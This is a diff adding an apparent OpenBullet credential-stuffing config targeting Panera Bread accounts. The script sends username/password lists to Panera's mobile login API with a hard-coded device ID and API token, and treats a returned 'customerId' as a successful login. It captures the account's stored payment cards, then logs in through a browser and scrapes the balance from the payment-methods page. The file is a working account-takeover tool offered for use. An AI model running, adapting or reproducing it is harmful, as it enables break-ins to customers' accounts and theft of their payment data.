@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "panera",
+  "SuggestedBots": 1,
+  "LastModified": "2018-08-18T17:41:18.0122873+02:00",
+  "AdditionalInfo": "",
+  "Author": "zvone",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://services-mob.panerabread.com/login" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Panera/3.20.1 (iPhone; iOS 10.2.1; Scale/2.00)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "deviceId: A9D58D65-504D-4C59-92EF-DF92615A924D" 
+  HEADER "api_token: bcf0be75-0de6-4af0-be05-13d7470a85f2" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "customerId" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid login credentials" 
+PARSE "<SOURCE>" LR "\"paymentOptions" "}]," Recursive=FALSE -> CAP "cards" "" "" 
+BROWSERACTION Open "" 
+NAVIGATE "https://www.panerabread.com/en-us/home.html" 60 
+ELEMENTACTION Id "global-sign-in" 
+  Click "" -> VAR "" 
+#user ELEMENTACTION Name "user_email" 
+  SendKeys "<USER>" -> VAR "" 
+#pass ELEMENTACTION Name "user_password" 
+  SendKeys "<PASS>" -> VAR "" 
+ELEMENTACTION Id "join-now-primary" 
+  Click "" -> VAR "" 
+NAVIGATE "https://delivery.panerabread.com/account/my_payment_methods" 60 
+ELEMENTACTION Selector "#accountInfo > div > div.col-xs-12.col-sm-9 > my-cards > div > div:nth-child(1) > div:nth-child(5) > div > div > div > card > div > div.row > div > div:nth-child(2) > div > p:nth-child(2)" 
+  GetText "" -> CAP "balance" 
